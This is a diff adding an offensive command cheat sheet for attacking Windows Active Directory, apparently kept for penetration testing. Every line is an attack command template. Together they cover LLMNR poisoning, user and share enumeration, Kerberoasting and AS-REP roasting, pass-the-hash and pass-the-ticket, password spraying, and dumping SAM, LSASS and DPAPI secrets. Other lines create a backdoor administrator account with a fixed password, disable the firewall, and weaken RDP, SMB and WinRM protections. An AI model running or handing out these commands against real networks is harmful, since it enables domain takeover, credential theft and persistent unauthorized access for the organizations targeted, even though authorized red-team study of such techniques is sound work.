@@ -1,0 +1,122 @@
+^AD Responder:sudo responder -i tun0 -A
+Powershell:pwsh -ep bypass
+Powershell (change global script policy):Get-ExecutionPolicy -Scope CurrentUser
+Powershell (change global script policy):Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+Powershell (change global script policy):Get-ExecutionPolicy -Scope CurrentUser
+Basic Domain Info:net view /domain
+Basic Domain Info:net view \\<hostname> /all
+Basic Domain Info:nltest /dclist:<domain>
+Basic Domain Info:nltest /dsgetdc:<domain>
+Basic Domain Info:nltest /dsgetsite
+Basic Domain Info:systeminfo | findstr /B /C:"Domain"
+Basic Domain Info:echo %USERDOMAIN%
+Forest Information:nltest /domain_trusts
+Forest Information:nltest /forest_trusts
+User Enumeration (Powershell):Get-LocalUser
+User Enumeration (Powershell):Get-LocalGroupMember <localgroup>
+User Enumeration (Net):net user /domain
+User Enumeration (Net):net user <user> /domain
+User Enumeration (Net):net accounts /domain
+User Enumeration (Net):net group "domain admins" /domain
+User Enumeration (Net):net group "enterprise admins" /domain
+User Enumeration (Impacket):impacket-getADUsers -dc-ip <dc-ip> <domain>/<user>:<password> -all
+User Enumeration (Impacket):impacket-getADUsers -dc-ip <dc-ip> -k -no-pass <domain>/
+Computer Enumeration (Net):net group "domain computers" /domain
+Computer Enumeration (Impacket):impacket-lookupsid <domain>/<user>:<password>@<dc-ip>
+Computer Enumeration (Impacket):impacket-lookupsid -no-pass -k <domain>/@<dc-ip>
+Group Enumeration (Powershell):Get-LocalGroup
+Group Enumeration (Net):net group /domain
+Group Enumeration (Impacket):impacket-netview -dc-ip <dc-ip> <domain>/<user>:<password>
+Group Enumeration (Impacket):impacket-netview -dc-ip <dc-ip> -k -no-pass <domain>/
+Share Enumeration (Net):net view \\<dc-ip>
+Share Enumeration (Impacket):impacket-smbclient -dc-ip <dc-ip> <domain>/<user>:<password>@<dc-ip>
+Share Enumeration (Impacket):impacket-smbclient -k -no-pass -dc-ip <dc-ip> <domain>/@<dc-ip>
+smb (list shares with NT hash auth): smbclient -L //<target> -U '<user>%<ntlm>' --pw-nt-hash -p <port>
+smb (list shares with NT hash auth): smbclient //<target>/<folder> -U '<user>%<ntlm>' --pw-nt-hash -p <port>
+GPO Enumeration:gpresult /z
+GPO Enumeration:gpresult /r
+DNS Enumeration (Impacket): impacket-adidnsdump -dc-ip <dc-ip> <domain>/<user>:<password>
+DNS Enumeration (Impacket): impacket-adidnsdump -dc-ip <dc-ip> -k -no-pass <domain>/
+Bloodhound Python Ingestor: bloodhound-ce-python -d <domain> -u <user> -p <password> -dc <dc-ip> -ns <dc-ip> -c All
+Bloodhound Python Ingestor: bloodhound-ce-python -d <domain> -u <user> -p <password> -dc <dc-ip> -k -c All -no-pass
+Bloodhound Python Ingestor: bloodhound-ce-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c Group,LocalAdmin,RDP,DCOM,Session
+Bloodhound Python Ingestor: bloodhound-ce-python -u "<user>" -p '<password>' -d <domain> -c all --zip -ns <target>
+Bloodhound Python Ingestor: bloodhound-ce-python -u "<user>" --hashes '<ntlm>' -d <domain> -c all --zip -ns <target> #  --hashes HASHES LM:NLTM hashes
+Bloodhound Sharphound Ingestor:SharpHound.exe -c All
+Bloodhound Sharphound Ingestor:SharpHound.exe --CollectionMethods All --Domain <domain> --DNSHost <dc-ip>
+Bloodhound Sharphound Ingestor:SharpHound.exe -c Group,LocalAdmin,RDP,DCOM,Session --ZipFileName <filename>
+Bloodhound Sharphound Ingestor (Stealth):SharpHound.exe -c Session --Loop --loopduration 00:00:10
+Rebeus AS-REP Roast:Rubeus.exe asreproast
+Rebeus AS-REP Roast:Rubeus.exe asreproast /format:hashcat /outfile:<filename>
+Rebeus Kerberoast:Rubeus.exe kerberoast
+Rebeus Kerberoast:Rubeus.exe kerberoast /stats
+Rebeus Kerberoast:Rubeus.exe kerberoast /rc4opsec
+Rebeus Kerberoast:Rubeus.exe kerberoast /aes
+Rebeus Kerberoast:Rubeus.exe kerberoast /outfile:<filename>
+Rebeus TGT Request:Rubeus.exe asktgt /user:<user> /aes256:<ntlm> /domain:<domain> /dc:<dc-ip> /ptt
+Rebeus TGT Request:Rubeus.exe asktgt /user:<user> /rc4:<ntlm> /domain:<domain> /dc:<dc-ip> /ptt
+Rebeus TGS Request:Rubeus.exe asktgs /ticket:<file> /service:<file> /ptt
+Rebeus S4U2Self:Rubeus.exe s4u /user:<user> /rc4:<ntlm> /impersonateuser:administrator /msdsspn:host/<dc-ip>.<domain> /ptt
+Rebeus S4U2Proxy:Rubeus.exe s4u /user:<user> /rc4:<ntlm> /impersonateuser:administrator /altservice:ldap /msdsspn:host/<dc-ip>.<domain> /ptt
+Rebeus TGT Harvest:Rubeus.exe harvest /interval:30
+Rebeus TGT Harvest:Rubeus.exe harvest /interval:60 /nowrap
+Rebeus Ticket Management:Rubeus.exe ptt /ticket:<file>
+Rebeus Ticket Management:Rubeus.exe dump /nowrap
+Rebeus Ticket Management:Rubeus.exe purge
+Rebeus Ticket Management:Rubeus.exe triage
+Rebeus Password Spray:Rubeus.exe brute /password:<password> /noticket
+Rebeus Password Spray:Rubeus.exe brute /passwords:<wordlist1> /noticket /outfile:<filename>
+Rebeus Pass The Ticket:Rubeus.exe ptt /ticket:<file>
+Rebeus Pass The Hash:Rubeus.exe asktgt /user:<user> /rc4:<ntlm> /ptt
+ldap search (Get all users):ldapsearch -x -H ldap://<target> -D '<domain>\<user>' -w '<password>' -b 'DC=<sld>,DC=<tld>'
+ldap search (Get all users and cleanup output):ldapsearch -x -H ldap://<target> -D '<domain>\<user>' -w '<password>' -b 'DC=<sld>,DC=<tld>' | grep userPrincipalName | sed 's/userPrincipalName: //'
+ldap search (Without credentials):ldapsearch -x -H ldap://<target> -b 'DC=<sld>,DC=<tld>'
+ldap search (Without credentials):ldapsearch -x -H ldap://<target> -b 'DC=<sld>,DC=<tld>' | grep userPrincipalName | sed 's/userPrincipalName: //'
+ldap search (Without credentials and clean output):ldapsearch -x -H ldap://<target> -b "DC=<sld>,DC=<tld>" "(objectClass=user)" sAMAccountName | grep sAMAccountName | grep -v 'HealthMailbox' | awk '{print $2}'
+ldap search (search for entity):ldapsearch -x -H ldap://<target> -b "DC=<sld>,DC=<tld>" "(sAMAccountName=<user>)"
+ldap search (Without credentials, broad user search):ldapsearch -x -H ldap://<target> -b "DC=<sld>,DC=<tld>" "(objectClass=person)" sAMAccountName | grep sAMAccountName | grep -v 'HealthMailbox' | awk '{print $2}'
+Kerbrute User Enum: kerbrute userenum -d <domain> --dc <dc-ip> <wordlist1>
+winrm (connect): evil-winrm -i <target> -u <user> -p <password>
+winrm (connect with domain auth with NT hash): evil-winrm -i <target> -u '<domain>\<user>' -H '<ntlm>'
+winrm (connect with domain auth with password): evil-winrm -i <target> -u '<domain>\<user>' -p '<password>'
+winrm (connect with NT hash): evil-winrm -i <target> -u <user> -H '<ntlm>'
+create new local user and add to administrator group: net user edwin P@ssw0rd@123 /add
+create new local user and add to administrator group: net localgroup administrators edwin /add
+create new domain user and add to domain group:net user edwin P@ssw0rd@123 /add /domain
+create new domain user and add to domain group:net group "<group>" edwin /add 
+create new domain user and add to domain group:net localgroup "Remote Management Users" edwin /add 
+create new domain user and add to domain group:net localgroup "Remote Desktop Users" edwin /add 
+donpapi collect -t <target> -d <domain> -u <user> -H :<ntlm>
+nxc smb (local auth with NT hash): nxc smb <target> -u <user> -H <ntlm> --local-auth
+nxc smb (domain auth with NT hash):nxc smb <target> -d '<domain>' -u '<user>' -H '<ntlm>'
+Credential-dump via SMB (NetExec lsassy module): nxc smb <target> -u <user> -p <password> -M lsassy
+Unharden windows (firewall): netsh advfirewall set allprofiles state off
+Unharden windows (firewall): netsh advfirewall firewall add rule name="WinRM Public" dir=in action=allow protocol=TCP localport=5985
+Unharden windows (rdp): reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+Unharden windows (rdp): reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+Unharden windows (rdp): reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+Unharden windows (rdp): reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f
+Unharden windows (rdp): net localgroup "Remote Desktop Users" "%username%" /add #add user to group
+Unharden windows (rdp): sc stop termservice
+Unharden windows (rdp): sc start termservice
+create new local admin and rdp in: net user edwin P@ssw0rd@123 /add
+create new local admin and rdp in: net localgroup administrators edwin /add
+create new local admin and rdp in: net user edwin
+create new local admin and rdp in: xfreerdp3 /v:<target> /u:edwin /p:'P@ssw0rd@123' /dynamic-resolution /clipboard /drive:share,/home/kali
+Unharden windows (smb): reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t reg_dword /d 00000001 /f
+Unharden windows (smb): reg add "HKLM\Software\Policies\Microsoft\Windows\LanmanWorkstation" /v "AllowInsecureGuestAuth" /t reg_dword /d 00000001 /f
+Unharden windows (smb): reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && ^ reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymous" /t REG_DWORD /d 0 /f && ^ reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymousSAM" /t REG_DWORD /d 0 /f && ^ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "EveryoneIncludesAnonymous" /t REG_DWORD /d 1 /f && ^ dism /online /norestart /enable-feature /featurename:SMB1Protocol && ^ net stop lanmanworkstation && net start lanmanworkstation && ^ net stop lanmanserver && net start lanmanserver
+Unharden windows (Enable WinRM remote management): reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 1 /f & winrm quickconfig -q & sc config winrm start= auto & net start winrm & netsh advfirewall firewall set rule group="Windows Remote Management" new enable=yes
+Unharden windows (Enable WinRM remote management): reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+Unharden windows (Enable WinRM remote management): sc start/query/stop winrm
+Unharden windows (Enable WinRM remote management): winrm enumerate winrm/config/listener #confirm winrm listener is alive
+Dumping SAM: reg.exe save hklm\sam C:\sam.save && reg.exe save hklm\system C:\system.save && reg.exe save hklm\security C:\security.save
+Dumping SAM: impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+SMB enumeration & SAM-dump (only with admin): nxc smb <target> -u '<domain>\<user>' -p '<password>' --sam secdump
+^Enumerates all users and groups with high-level AD rights (GenericAll, GenericWrite, WriteDacl, WriteOwner, AddMember, ForceChangePassword) on other objects: $interesting='GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword'; (Get-NetUser|Select-Object -ExpandProperty samaccountname) + (Get-NetGroup|Select-Object -ExpandProperty cn)|ForEach-Object{$o=$_;Get-ObjectAcl -Identity $o|Where-Object{$_.ActiveDirectoryRights -match $interesting}|ForEach-Object{$r=Convert-SidToName -Sid $_.SecurityIdentifier;[PSCustomObject]@{Object=$o;Principal=$r;Rights=$_.ActiveDirectoryRights}}}|Format-Table -AutoSize
+^Takes all SIDs from Get-ObjectAcl -Identity <user> and resolves them to names with PowerView’s Convert-SidToName: Import-module .\PowerView.ps1
+^Takes all SIDs from Get-ObjectAcl -Identity <user> and resolves them to names with PowerView’s Convert-SidToName: Get-ObjectAcl -Identity <user> | ForEach-Object { [PSCustomObject]@{ IdentityReference = (Convert-SidToName -Sid $_.SecurityIdentifier); SID = $_.SecurityIdentifier; Rights = $_.ActiveDirectoryRights } } | Format-Table -AutoSize
+^Resolve SID to account name: [System.Security.Principal.SecurityIdentifier]::new("<SID>").Translate([System.Security.Principal.NTAccount])
+Port Scan (Powershell):Test-NetConnection -Port <port> <target>
+telnet (Powershell): dism /online /Enable-Feature /FeatureName:TelnetClient
+telnet (Powershell): telnet <target> <port>
